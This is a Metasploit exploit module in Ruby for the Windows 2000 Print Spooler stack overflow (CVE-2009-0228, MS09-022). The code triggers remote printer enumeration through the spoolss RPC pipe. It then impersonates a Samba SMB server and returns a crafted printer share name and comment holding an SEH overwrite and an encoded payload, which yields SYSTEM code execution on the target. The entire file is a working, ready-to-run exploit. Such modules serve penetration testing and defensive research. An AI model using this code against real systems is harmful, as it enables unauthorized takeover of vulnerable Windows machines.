##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/windows_error'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	
	include Msf::Exploit::Remote::SMBServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows 2000 Print Spooler Remote Stack Overflow',
			'Description'    => %q{
					This module exploits an one-off bug in the handling of the share name and
				comment of printers enumerated by EnumPrinters, resulting in a stack overflow
				that allows for code execution with SYSTEM privileges.
				The vulnerability is triggered by making the remote machine enumerate a locally
				shared printer with a specially crafted name and comment through an RPC call to
				RpcEnumPrinters.
			},
			'Author'         =>
				[
					'xero',
					'jduck',   # counseling
					'hdm',     # for giving me a SMB server template I could steal
					'Jun Mao', # discovered the vuln
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'Platform'       => 'win',
			'References'     =>
				[
					[ 'OSVDB', '54932 ' ],
					[ 'CVE', '2009-0228 ' ],
					[ 'MSB', 'MS09-022' ]
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1038,
					'BadChars' => "",
					'DisableNops' => true,
				},
			'Targets'        =>
				[
					[ 'Windows 2000', { } ]
				],
			'DisclosureDate' => 'Jun 10 2009',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::LHOST(),
				OptString.new('SMBPIPE', [ false,  "The named pipe for the spooler service", "spoolss"]),
			], self.class)
	end
	
	# EnumPrinters only enumerates remote printers if the hostname is given in the form of "Windows NT Remote Printers!!\\<host>"
	# That format is dependent on the language of the target machine, so this function takes the host name in Unicode format,
	# to allow for exotic targets
	def custom_enumprinters(host, blen, do_recv = true)
		stub =
			NDR.long(0x8) + # [in] DWORD Flags = PRINTER_ENUM_NAME
			(host ? NDR.uwstring_prebuilt(host) : NDR.long(0)) + # [in, string, unique] STRING_HANDLE Name
			NDR.long(1) + # [in] DWORD Level
			NDR.long(rand(0xffffffff)+1)+ # [in, out, unique, size_is(cbBuf), disable_consistency_check] BYTE* pPrinterEnum
			NDR.long(blen) +
			"\x00" * blen +
			NDR.long(blen)
			
			
		begin
			return dcerpc.call(0x00, stub, do_recv)
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("EnumPrinters exception: " << e.to_s)
			return nil
		end
	end
	
	def get_printers()
		resp = custom_enumprinters(nil, 0)
		return nil if not resp
		
		blen = resp.unpack("V*")[2]
		
		resp = custom_enumprinters(nil, blen)
		return nil if not resp
		
		bcnt, pcnt, stat = resp[-12, 12].unpack("V3")
		return nil if stat != 0
		return nil if pcnt == 0
		return nil if bcnt != blen
		
		printers = []
		
		0.upto(pcnt-1) do |i|
			base = 8 + (i*16)
			
			flags, desc_o, name_o, comm_o = resp[base, 16].unpack("V4")
			
			desc = resp[base + name_o .. -1].gsub(/^(.*?\0?)\0\0.*/, '\1')
			name = resp[base + desc_o .. -1].gsub(/^(.*?\0?)\0\0.*/, '\1')
			comm = resp[base + comm_o .. -1].gsub(/^(.*?\0?)\0\0.*/, '\1')
			
			printers << [flags, desc, name, comm]
		end
		
		printers
	end
	
	# exploit method is provided by the SMB server
	def primer
		# trigger the enumeration in a thread, so the server still exists when primer returns
		Thread.new { trigger_enumeration }
	end

	def trigger_enumeration
		connect()
		smb_login()

		print_status("Trying target #{target.name}...")
		
		handle = dcerpc_handle(
			'12345678-1234-abcd-EF00-0123456789ab', '1.0',
			'ncacn_np', ["\\#{datastore['SMBPIPE']}"]
		)

		print_status("Binding to #{datastore['SMBPIPE']}...")
		dcerpc_bind(handle)

		print_status("Bound to #{datastore['SMBPIPE']}, triggering printer enumeration...")

		printers = get_printers()
		
		if not printers
			print_error("Couldn't get printer names of remote machine")
			return
		end
		
		# try to trigger a remote enumeration using each of the possible formats
		printers.each do |p|
			custom_enumprinters(p[1] << Rex::Text.to_unicode("!!\\\\" << datastore['LHOST'] << "\0"), 0, false)
		end
		
		print_status("Everything set, waiting for the target to connect back to us...")

		cnt = 1
		while session_created? == false and cnt < 25
			::IO.select(nil, nil, nil, 0.25)
			cnt += 1
		end

	rescue ::Rex::Proto::SMB::Exceptions::ErrorCode, Rex::ConnectionError
		raise RuntimeError, $!.message
		
	ensure
		disconnect()
		cleanup()
		
	end
	


	def smb_cmd_dispatch(cmd, c, buff)
		smb = @state[c]
		
		packet_types = {
			CONST::SMB_COM_NEGOTIATE => 			[:smb_cmd_negotiate, CONST::SMB_NEG_PKT, CONST::SMB_NEG_RES_NT_PKT],
			CONST::SMB_COM_SESSION_SETUP_ANDX => 	[:smb_cmd_session_setup, CONST::SMB_SETUP_NTLMV1_PKT, CONST::SMB_SETUP_RES_PKT],
			CONST::SMB_COM_TREE_CONNECT_ANDX => 	[:smb_cmd_tree_con, CONST::SMB_TREE_CONN_PKT, CONST::SMB_TREE_CONN_RES_PKT],
			CONST::SMB_COM_NT_CREATE_ANDX  => 		[:smb_cmd_create_andx, CONST::SMB_CREATE_PKT, CONST::SMB_CREATE_RES_PKT],
			CONST::SMB_COM_TRANSACTION => 			[:smb_cmd_trans, CONST::SMB_TRANS_PKT, CONST::SMB_TRANS_RES_PKT],
			CONST::SMB_COM_READ_ANDX => 			[:smb_cmd_read, CONST::SMB_READ_PKT, CONST::SMB_READ_RES_PKT],
			CONST::SMB_COM_CLOSE => 				[nil, CONST::SMB_CLOSE_PKT, CONST::SMB_CLOSE_RES_PKT]
		}
		
		pkt = CONST::SMB_BASE_PKT.make_struct
		pkt.from_s(buff)
		
		# All responses need to match the requests in these
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']

		if packet_types.has_key?(cmd)
			type = packet_types[cmd]
			
			pkt = type[1].make_struct
			pkt.from_s(buff)
			
			
			resp_pkt = type[2].make_struct
			smb_set_defaults(c, resp_pkt)
			
			# standard parameters for responses
			resp_pkt['Payload']['SMB'].v['Command'] = cmd
			resp_pkt['Payload']['SMB'].v['Flags1'] = 0x88
			resp_pkt['Payload']['SMB'].v['Flags2'] = 0xc001
			
			begin
				resp_pkt['Payload'].v['AndX'] = CONST::SMB_COM_NO_ANDX_COMMAND
			rescue Exception
			end
			
			# call the handler for this packet type
			method(type[0]).call(c, buff, pkt, resp_pkt) if type[0]
			
			c.put(resp_pkt.to_s)
		else
			print_status("Ignoring request of type #{cmd} from #{smb[:name]}")
			
			resp_pkt = CONST::SMB_BASE_PKT.make_struct
			smb_set_defaults(c, resp_pkt)
			
			resp_pkt['Payload']['SMB'].v['Command'] = cmd
			resp_pkt['Payload']['SMB'].v['Flags1']  = 0x88
			resp_pkt['Payload']['SMB'].v['Flags2']  = 0xc001
			resp_pkt['Payload']['SMB'].v['ErrorClass'] = 0
			
			c.put(resp_pkt.to_s)
		end
	end

	def smb_cmd_negotiate(c, buff, pkt, resp_pkt)
		smb = @state[c]

		group    = ''
		machine  = smb[:nbsrc]

		dialects = pkt['Payload'].v['Payload'].gsub(/\x00/, '').split(/\x02/).grep(/^\w+/)
		# print_status("Negotiation from #{smb[:name]}: #{dialects.join(", ")}")

		dialect =
			dialects.index("NT LM 0.12") ||
			dialects.length-1


		# Dialect selected, now we try to the target system
		target_host = datastore['SMBHOST']
		if (not target_host or target_host.strip.length == 0)
			target_host = smb[:ip]
		end

		rsock = nil
		rport = nil
		[445, 139].each do |rport_|
			rport = rport_
			begin
				rsock = Rex::Socket::Tcp.create(
					'PeerHost'  => target_host,
					'PeerPort'  => rport,
					'Timeout'   => 3,
					'Context'   =>
						{
							'Msf'        => framework,
							'MsfExploit' => self,
						}
				)
				break if rsock
			rescue ::Interrupt
				raise $!
			rescue ::Exception => e
				print_error("Error connecting to #{target_host}:#{rport} #{e.class} #{e}")
			end
		end

		if(not rsock)
			print_error("Could not connect to the target host (#{target_host}), the target may be firewalled.")
			return
		end

		rclient = Rex::Proto::SMB::SimpleClient.new(rsock, rport == 445 ? true : false)

		begin
			rclient.login_split_start_ntlm1(smb[:nbsrc])
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("Could not negotiate NTLMv1 with #{target_host}:#{rport} #{e.class} #{e}")
			raise e
		end

		if (not rclient.client.challenge_key)
			print_error("No challenge key received from #{smb[:ip]}:#{rport}")
			rsock.close
			return
		end

		if (smb[:rsock])
			smb[:rsock].close
		end

		smb[:rsock] = rsock
		smb[:rclient] = rclient
		smb[:rhost] = target_host


		time_hi, time_lo = UTILS.time_unix_to_smb(Time.now.to_i)

		resp_pkt['Payload']['SMB'].v['WordCount'] = 17
		
		resp_pkt['Payload'].v['Dialect'] = dialect
		resp_pkt['Payload'].v['SecurityMode'] = 3
		resp_pkt['Payload'].v['MaxMPX'] = 2
		resp_pkt['Payload'].v['MaxVCS'] = 1
		resp_pkt['Payload'].v['MaxBuff'] = 4356
		resp_pkt['Payload'].v['MaxRaw'] = 65536
		resp_pkt['Payload'].v['Capabilities'] = 0xe3fd # no extended negotiation supported, makes things easier
		resp_pkt['Payload'].v['ServerTime'] = time_lo
		resp_pkt['Payload'].v['ServerDate'] = time_hi
		resp_pkt['Payload'].v['Timezone']   = 0x0


		resp_pkt['Payload'].v['SessionKey'] = 0
		resp_pkt['Payload'].v['KeyLength'] = 8

		resp_pkt['Payload'].v['Payload'] =
			rclient.client.challenge_key +
			Rex::Text.to_unicode(group) + "\x00\x00" +
			Rex::Text.to_unicode(machine) + "\x00\x00"
			
		prepare_payload(c)
	end
	

	def smb_cmd_session_setup(c, buff, pkt, resp_pkt)
		smb = @state[c]

		print_status("Setting up SMB session...")
		
		# Note: This is actually a combined Session setup and Tree connect AndX packet,
		# but simply ignoring the Tree connection request in the response causes it to be
		# resent separately, saving the hassle of having to deal with AndX responses
		
		# packet needs to be reset with new information
		smb[:user_id] = 100
		smb[:tree_id] = 1
		smb_set_defaults(c, resp_pkt)
		
		
		resp_pkt['Payload']['SMB'].v['WordCount'] = 3
		
		resp_pkt['Payload'].v['Action'] = 1
		
		# pose as a Unix Samba server (should be inconspicuous enough)
		resp_pkt['Payload'].v['Payload'] =
			Rex::Text.to_unicode("Unix\0") <<
			Rex::Text.to_unicode("Samba 3.4.7\0") <<
			Rex::Text.to_unicode("WORKGROUP\0")
	end
	
	def smb_cmd_tree_con(c, buff, pkt, resp_pkt)
		smb = @state[c]
		
		print_status("Received a Tree Connect request")
		
		resp_pkt['Payload']['SMB'].v['WordCount'] = 7
		
		resp_pkt['Payload'].v['SupportWords'] = "\xff\x01\x00\x00\xff\x01\x00\x00"
		resp_pkt['Payload'].v['Payload'] = "IPC\0\0\0"
	end
	
	def smb_cmd_create_andx(c, buff, pkt, resp_pkt)
		smb = @state[c]
		
		print_status("Received an NT Create request")
		
		resp_pkt['Payload']['SMB'].v['WordCount'] = 42
		
		smb[:file_id] = rand(0xFFFF)+1
		
		resp_pkt['Payload'].v['FileID'] = smb[:file_id]
		resp_pkt['Payload'].v['Action'] = 1 # successfully opened
		resp_pkt['Payload'].v['Attributes'] = 0x80 # normal file
		resp_pkt['Payload'].v['FileType'] = 2 # named pipe in message mode
		resp_pkt['Payload'].v['IPCState'] = 0x05ff # readable message pipe, 255 Icount
	end
	
	def smb_cmd_trans(c, buff, pkt, resp_pkt)
		smb = @state[c]
		
		#print_status("Received a Transaction packet")
		
		# SetupData's length (in words) is passed in SetupCount, update the struct accordingly
		# and reread the packet
		pkt['Payload']['SetupData'].size = pkt['Payload'].v['SetupCount']*2
		pkt.from_s(buff)
		
		# SetupData determines the sub-protocol of the payload
		if pkt['Payload'].v['SetupData'] != [0x26, smb[:file_id]].pack("v2")
			print_status("Transaction packet isn't communicating through our named pipe")
			return
		end
		
		dce_pkt = pkt['Payload'].v['Payload'].unpack('A14vCCCCNvvV')
		
		case dce_pkt[5] # packet type
		when 11 # bind
			print_status("Received a DCERPC bind packet")
			
			dce_resp = # DCE bind_ack
				[5, # major version
				0, # minor version 
				12, # packet type = bind_ack
				3, # flags = single fragment
				0x10000000, # data representation = little-endian, ASCII
				68, # frag length
				0, # auth length
				1, # call id
				4280, # max xmit frag
				4280, # max recv frag
				rand(0xFFFF)+1,#0x53f0, # assoc group
				13, # scndry addr len
				"\\PIPE\\srvsvc\0", # scndry addr
				1, # num results
				0, # ack result = Acceptance
				"\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60", # transfer syntax
				2 # syntax ver
				].pack("CCCCNvvVvvVvA13xCx3VA16V")
				
		when 0 # request
			print_status("Received a DCERPC request packet, sending first part of payload")
			
			# only send the first 1024 bytes of the payload packet, the rest will be requested later
			dce_resp = smb[:exploit_pkt][0..1023]
			resp_pkt['Payload']['SMB'].v['ErrorClass'] = 0x80000005 # STATUS_BUFFER_OVERFLOW
		else
			print_error("Received a DCERPC packet of unknown type")
			
			dce_resp = ""
		end
		
		resp_pkt['Payload']['SMB'].v['WordCount'] = 10
		resp_pkt['Payload'].v['DataCountTotal'] = dce_resp.length
		resp_pkt['Payload'].v['DataCount'] = dce_resp.length
		resp_pkt['Payload'].v['ParamOffset'] = 56
		resp_pkt['Payload'].v['DataOffset'] = 56
		resp_pkt['Payload'].v['Payload'] = "\x00" << dce_resp
	end
	
	def smb_cmd_read(c, buff, pkt, resp_pkt)
		smb = @state[c]
		
		print_status("Received a Read request, sending rest of payload")
		
		rest = smb[:exploit_pkt][1024..-1]
		
		if rest.length != pkt['Payload'].v['Remaining']
			print_error("The remote machine's read request differs in length from the remaining payload")
			return
		end
		
		resp_pkt['Payload']['SMB'].v['WordCount'] = 12
		resp_pkt['Payload'].v['DataLenLow'] = rest.length
		resp_pkt['Payload'].v['Reserved4'] = rest.length # should be 0, my Samba server set it anyway
		resp_pkt['Payload'].v['DataOffset'] = 59
		
		resp_pkt['Payload'].v['Payload'] = rest
	end
	
	def prepare_payload(c)
		smb = @state[c]
		
		# force an access violation for reliable triggering of the SEH handler
		crash = [0x80000000+rand(0x7FFFFFFF)].pack("V")
		
		# from our SEH handler, jump to the beginning of the payload
		seh = "\xE9\x38\xFB\xFF\xFF" << "\xEB\xF9\xDE\xAD" << [0x01001819].pack("V")

		exploit = Rex::Text.rand_text(0x30) + crash
		exploit << Rex::Text.rand_text(0x88 - seh.length) << seh << "\x00\x00"
		
		
		payl = payload.encoded
		payl << Rex::Text.rand_text(1038 - payl.length) << "\x00\x00"
		
		
		resp_payload =
			[1, # information level
			1, # ?
			0x20000, # ref id (for "unique" elements in NDR-speak)
			1, # result count
			0x20004, # ref id
			1, # max result count
			0x20008, # ref id
			1, # share type = STYPE_PRINTQ
			0x2000C, # ref id
			
			# name
			payl.length/2, # max count
			0, # offset
			payl.length/2, # actual count
			payl << Rex::Encoder::NDR.align(payl), # aligned name
			
			# comment
			exploit.length/2,
			0,
			exploit.length/2,
			exploit << Rex::Encoder::NDR.align(exploit), # aligned comment
			
			1, # total entries
			0, # resume handle = NULL
			0 # status = WERR_OK
			].pack("V12A*V3A*V3")
			
		
		smb[:exploit_pkt] =
			[5, # major version
			0, # minor version
			2, # packet type = response
			3, # flags = single fragment
			0x10000000, # data representation = little-endian, ASCII
			resp_payload.length + 0x18, # frag length
			0, # auth length
			1, # call id
			resp_payload.length, # alloc hint
			0, # context id
			0, # cancel count
			resp_payload
			].pack("CCCCNvvVVvCxA*")
	end

end
